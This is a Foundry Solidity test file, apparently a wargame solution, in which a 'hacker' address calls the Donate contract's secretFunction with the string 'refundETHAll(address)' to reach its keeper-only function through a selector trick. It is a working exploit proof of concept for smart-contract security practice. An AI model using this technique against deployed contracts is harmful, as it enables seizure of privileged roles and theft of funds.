// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/Donate.sol";

interface IDonate{
    function changeKeeper(address _newKeeper) external;
    function secretFunction(string memory f) external;
    function keeperCheck() external view returns (bool);
}

contract donateHack is Test {
    IDonate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        bytes memory args = abi.encode(keeper);
        address _donate = deployCode("src/Donate.sol:Donate", args);
        donate = IDonate(_donate);
    }

    function testhack_donate() public {
        vm.startPrank(hacker);
        donate.secretFunction("refundETHAll(address)");
        vm.stopPrank();
        // Hack Time
    }
}
